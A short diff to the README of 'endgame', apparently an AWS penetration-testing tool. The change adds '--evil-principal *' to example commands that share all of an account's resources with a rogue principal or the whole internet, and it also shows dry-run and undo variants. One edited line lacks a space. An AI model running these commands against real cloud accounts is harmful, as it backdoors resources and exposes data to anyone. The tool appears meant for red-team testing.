@@ -6,13 +6,13 @@ Share an AWS account's resources with a rogue AWS Account - or to the entire int
 
 ```bash
 # this will ruin your day
-endgame smash --service all
+endgame smash --service all --evil-principal *
 # This will show you how your day could have been ruined
-endgame smash --service all --dry-run
+endgame smash --service all --evil-principal * --dry-run
 # Atone for your sins
-endgame smash --service all --undo
+endgame smash --service all --evil-principal *--undo
 # Consider maybe atoning for your sins
-endgame smash --service all --undo --dry-run
+endgame smash --service all --evil-principal * --undo --dry-run
 ```
 
 ## Supported Backdoors
